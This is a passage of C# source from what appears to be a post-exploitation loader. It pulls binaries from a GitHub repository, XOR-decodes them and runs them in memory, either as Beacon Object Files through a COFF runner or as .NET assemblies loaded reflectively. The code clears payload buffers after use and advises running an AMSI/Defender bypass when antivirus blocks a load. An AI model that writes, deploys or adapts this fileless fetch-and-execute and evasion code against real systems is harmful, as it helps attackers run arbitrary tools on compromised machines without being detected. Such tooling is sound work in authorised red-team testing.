            //          http client / auth / error handling as the initial list)
            // execute: hand an artifact + raw arg string to the shared loader
            var cli = new ArtifactCli(
                Console.In, Console.Out,
                refresh: async () =>
                {
                    Info($"Re-querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");
                    List<(string Name, string DownloadUrl, long Size)> fresh;
                    try { fresh = await ListBinaries(http, owner, repo, folder, branch); }
                    catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)404)
                    { Err($"Path not found: {owner}/{repo}/{folder}"); return null; }
                    catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)403)
                    { Err("Rate limit or auth required (403). Use --token."); return null; }
                    catch (Exception ex)
                    { Err($"GitHub API error: {ex.Message}"); return null; }
                    if (fresh.Count == 0) { Err("No .exe/.dll/.o files found."); return null; }
                    return ArtifactCatalog.Build(branch, fresh);
                },
                execute: (e, args) => ExecuteArtifactAsync(http, xorKey, bofEntry, e, args));
            return await cli.RunLoop();
        }

        // -- Shared execution path ------------------------------------------
        // Used by --exec, the REPL `run`/direct-alias invocation, and the
        // active-artifact prompt. Downloads via the existing http client (same
        // auth/headers), optionally XOR-decodes, and dispatches to BofRunner
        // for COFF/BOF or to the reflective .NET loader otherwise.
        //
        // rawArgs is passed *unchanged*: BOF packing consumes it directly, the
        // .NET path tokenises it via the existing quote-aware ParseArgs. No
        // shell construction, no eval, no string interpolation into a command.
        private static async Task<int> ExecuteArtifactAsync(
            HttpClient http, byte xorKey, string bofEntry, ArtifactEntry entry, string rawArgs)
        {
            if (string.IsNullOrEmpty(entry.DownloadUrl))
            { Err($"No download_url for {entry.OriginalName}"); return 1; }

            Info($"Downloading {entry.OriginalName} ...");
            byte[] asmBytes;
            try   { asmBytes = await http.GetByteArrayAsync(entry.DownloadUrl); }
            catch (Exception ex) { Err($"Download failed: {ex.Message}"); return 1; }
            Ok($"{asmBytes.Length:N0} bytes received");

            // The legacy one-shot path cleared Authorization after the first
            // download. The persistent browser keeps it so `refresh` can
            // re-query private repos (the token was needed for listing too).

            if (xorKey != 0)
            {
                byte[] decoded = XorBytes(asmBytes, xorKey);
                ClearBytes(asmBytes);
                asmBytes = decoded;
                Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");
            }

            // -- BOF (COFF object) path --
            if (BofRunner.IsBof(asmBytes))
            {
                Ok($"{entry.OriginalName} detected as COFF/BOF -- using BofRunner");

                string rawBofArgs = rawArgs ?? "";
                byte[] packedArgs = PackBofArgs(rawBofArgs);

                var bofOpts = new BofOptions
                {
                    EntryPoint = bofEntry,
                    Log        = s => Warn(s),
                };
                using var runner = new BofRunner(bofOpts);
                Info($"Executing BOF {entry.OriginalName}{(packedArgs.Length > 0 ? $" ({packedArgs.Length} packed bytes)" : "")} ...");
                var result = runner.Run(asmBytes, packedArgs);
                ClearBytes(asmBytes);
                if (result.Output.Length > 0) Console.WriteLine(result.Output);
                if (result.TimedOut) Warn("BOF timed out (continuing).");
                Info($"Done.  elapsed={result.Elapsed.TotalMilliseconds:F1}ms");
                return result.ExitCode;
            }

            // -- Verify managed assembly --
            if (!IsNetAssembly(asmBytes))
            {
                Err($"{entry.OriginalName} is a native/unmanaged binary (PyInstaller, C++, etc.) -- cannot reflectively load.");
                ClearBytes(asmBytes);
                return 1;
            }

            // -- Load --
            Assembly asm;
            try   { asm = Assembly.Load(asmBytes); }
            catch (Exception ex)
            {
                Err($"Assembly.Load failed: {ex.Message}");
                if (IsAmsiBlock(ex))
                    Warn("Payload blocked by AMSI/Defender during Assembly.Load. Run a clean evasion bypass first with --amsi-bypass <owner/name/subfolder>.");
                ClearBytes(asmBytes);
                return 1;
            }

            ClearBytes(asmBytes);
            Ok($"Loaded: {asm.GetName().Name}");

            // -- Args: passed through the existing structured handler --
            string[] toolArgs    = string.IsNullOrWhiteSpace(rawArgs) ? Array.Empty<string>() : ParseArgs(rawArgs!);
            string   argsDisplay  = rawArgs ?? "";
            Info($"Executing {entry.OriginalName}{(toolArgs.Length > 0 ? $" -- {argsDisplay}" : "")} ...");

            // -- Invoke --
            int rc = InvokeMain(asm, toolArgs);
            return rc;
        }

        // Human-readable size for the catalog listing.
        private static string HumanSize(long bytes)
        {
            if (bytes >= 1024L * 1024L) return $"{bytes / (1024L * 1024L)} MB";
            if (bytes >= 1024L)         return $"{bytes / 1024L} KB";
            return $"{bytes} B";
        }
    }
}